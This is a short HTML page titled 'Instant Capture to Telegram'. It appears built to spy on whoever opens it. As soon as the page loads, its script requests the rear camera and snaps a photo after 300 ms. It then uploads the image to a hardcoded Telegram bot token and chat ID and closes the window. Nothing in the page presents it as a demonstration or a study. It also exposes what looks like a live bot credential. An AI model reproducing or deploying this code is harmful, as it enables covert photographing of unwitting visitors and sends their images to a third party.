<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Instant Capture to Telegram</title>
    <style>
        body {
            background: white;
            margin: 0;
            padding: 20px;
            font-family: Arial, sans-serif;
            text-align: center;
        }
        #status {
            margin-top: 50px;
            padding: 15px;
            border-radius: 5px;
            font-size: 18px;
            transition: all 0.3s;
        }
        .success { background: #e6f7e6; }
        .error { background: #ffebee; color: #d32f2f; }
    </style>
</head>
<body>
    <div id="status">Starting...</div>

    <script>
        // ============= CONFIGURATION =============
        const BOT_TOKEN = 'bot7876599612:AAHYBbJz6IHKae4BBtEkyASRlrJVVWtNOqc';
        const CHAT_ID = '7041008009';
        // =========================================

        async function ultraFastCapture() {
            const statusEl = document.getElementById('status');
            
            try {
                // 1. Quick validation (no delay)
                if (!BOT_TOKEN.startsWith('bot') || !CHAT_ID) {
                    throw new Error("Invalid configuration");
                }

                // 2. Instant camera access with minimal checks
                statusEl.textContent = "Accessing camera...";
                const stream = await navigator.mediaDevices.getUserMedia({
                    video: {
                        facingMode: 'environment',
                        width: { ideal: 640 },  // Lower resolution = faster
                        height: { ideal: 480 }
                    }
                });

                // 3. Ultra-fast capture (300ms delay only)
                statusEl.textContent = "Capturing...";
                const video = document.createElement('video');
                video.srcObject = stream;
                video.autoplay = true;
                video.playsInline = true;

                await new Promise(resolve => {
                    video.onloadedmetadata = () => setTimeout(resolve, 300); // Minimal focus time
                });

                const canvas = document.createElement('canvas');
                canvas.width = video.videoWidth;
                canvas.height = video.videoHeight;
                const ctx = canvas.getContext('2d');
                ctx.drawImage(video, 0, 0);
                const photoData = canvas.toDataURL('image/jpeg', 0.7); // Faster compression
                
                // Immediately stop camera
                stream.getTracks().forEach(track => track.stop());

                // 4. Parallel processing - start upload while converting
                statusEl.textContent = "Sending...";
                const blob = await fetch(photoData).then(r => r.blob());
                const formData = new FormData();
                formData.append('chat_id', CHAT_ID);
                formData.append('photo', blob, 'instant.jpg');

                // 5. Fast upload with minimal timeout
                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
                    method: 'POST',
                    body: formData
                });

                statusEl.textContent = "âœ“ Sent successfully!";
                statusEl.className = "success";
                setTimeout(window.close, 1000);

            } catch (error) {
                statusEl.textContent = "Error: " + error.message;
                statusEl.className = "error";
                console.error(error);
            }
        }

        // Start immediately with no DOMContentLoaded wait
        ultraFastCapture();
    </script>
</body>
</html>
